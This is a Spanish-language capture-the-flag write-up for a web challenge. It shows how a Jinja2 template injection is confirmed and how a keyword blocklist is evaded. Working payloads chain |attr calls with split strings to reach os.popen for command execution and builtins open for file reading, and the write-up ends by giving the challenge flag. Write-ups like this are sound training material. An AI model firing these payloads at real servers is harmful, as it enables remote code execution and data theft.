# Writeup: Research Portal

## Información del Reto
- **Nombre**: Research Portal: Early Access
- **Categoría**: Web
- **Dificultad**: Intermedia
- **Autor**: __hrcamilo_

## Contexto
La Universidad ha lanzado una versión preliminar de su nuevo portal de investigadores. Algunos becarios han reportado que la función de personalización del dashboard permite inyectar contenido arbitrario, pero el equipo de TI ha implementado un "Filtro de Seguridad Avanzado" para evitar ataques. ¿Podrás evadir el filtro y encontrar el secreto guardado en el servidor?

## Objetivo
Leer el archivo `flag.txt` que se encuentra en el servidor.

---

## Solución

### 1. Análisis Inicial
Al entrar al portal, vemos un campo para ingresar nuestro "ID de Investigador". Si ingresamos un nombre como `Admin`, la URL cambia a:
`/?name=Admin`
Y el mensaje dice: `Bienvenido al Portal de Investigación, Admin!`

### 2. Identificación de la Vulnerabilidad
Probamos si hay una inyección de plantillas (SSTI) enviando `{{ 7*7 }}` como nombre.
URL: `/?name={{7*7}}`
Resultado: `Bienvenido al Portal de Investigación, 49!`
Confirmado: **SSTI en Jinja2**.

### 3. Exploración del Filtro
Si intentamos payloads comunes para RCE como:
`{{ self.__dict__ }}` o `{{ config }}`
Obtenemos un error: `Error: Intento de intrusión detectado. El uso de palabras clave reservadas está prohibido.`

Palabras bloqueadas identificadas: `class`, `mro`, `subclasses`, `config`, `self`, `request`, `import`, `builtins`, `eval`.

### 4. Bypass del Filtro
Como no podemos usar la palabra `class` directamente, podemos usar el filtro `|attr` de Jinja2 y concatenación de strings para construir la llamada.

Payload para obtener la clase base (object):
`{{ ''|attr('__cla'+'ss__')|attr('__m'+'ro__')|attr('__getit'+'em__')(1) }}`

Ahora, listamos las subclases:
`{{ ''|attr('__cla'+'ss__')|attr('__m'+'ro__')|attr('__getit'+'em__')(1)|attr('__subcla'+'sses__')() }}`

Buscamos una clase que nos permita ejecutar comandos o leer archivos. `os._wrap_close` suele ser útil. Usualmente está en un índice alto (ej. 132, 137, depende de la versión).

Para simplificar el proceso, podemos usar la función `lipsum` que suele estar disponible:
`{{ lipsum|attr('__glob'+'als__')|attr('__getit'+'em__')('os')|attr('popen')('cat flag.txt')|attr('read')() }}`

Sin embargo, `os` y `popen` están disponibles en `lipsum.__globals__`.
Probemos:
`{{ lipsum|attr('__glob'+'als__')|attr('__getit'+'em__')('__buil'+'tins__')|attr('__getit'+'em__')('open')('flag.txt')|attr('read')() }}`

### 5. Flag Final
Al enviar el payload anterior (codificado para URL si es necesario), obtenemos el contenido del archivo `flag.txt`.

**Flag**: `UPB{S5TI_W1th_フィルタer_ByP4ss_7749}`
